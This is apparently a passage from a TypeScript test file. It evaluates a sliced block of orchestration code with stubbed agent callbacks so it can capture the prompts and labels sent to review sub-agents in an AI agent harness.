  return new Function(`${match[0]}\nreturn shellQuote`)();
})();

function runFanout(opts: { rook?: unknown; scope?: unknown } = {}) {
  const block = sliceBlock(FANOUT_START, FANOUT_END);
  const labels: string[] = [];
  const prompts: string[] = [];
  const logs: string[] = [];

  const factory = new Function(
    "log", "agent", "briefedAgent", "parallel", "discovery", "projectConfig",
    "PROJECT_ROOT", "HARNESS_ROOT", "WORK_DIR", "ISSUE", "GATE_RESULT_SCHEMA",
    "reviewSha", "rookScopeCommand", "rookGateVerdict", "securityVerdict",
    "shellQuote",
    `return (async () => {${block}})()`,
  );

  const done = factory(
    (m: unknown) => logs.push(String(m)),
    async (p: string, o: { label: string }) => {
      labels.push(o.label);
      prompts.push(p);
      if (o.label === "rook-scope") return opts.scope ?? GOOD_SCOPE;
      return {};
    },
    async (p: string, o: { label: string }) => {
      labels.push(o.label);
      prompts.push(p);
      return o.label === "rook" ? (opts.rook ?? { result: "PASS" }) : { result: "PASS" };
    },
    (thunks: Array<() => Promise<unknown>>) => Promise.all(thunks.map(t => t())),
    { ceremonyTier: "LIGHT", acs: [], filesToModify: ["lib/a.ts"] },
    { container: null },
    REPO_ROOT, REPO_ROOT, "/tmp/work", 129, {},
    SHA,
    inlined.rookScopeCommand,
    inlined.rookGateVerdict,
    { spawned: false, verdict: "FAIL", failures: ["the security review did not run"] },
    shellQuote,
  ) as Promise<void>;

  return { done, labels, prompts, logs };
}

async function runFanoutPrompts(): Promise<string[]> {
  const { done, prompts } = runFanout();
  await done;
  return prompts;
}
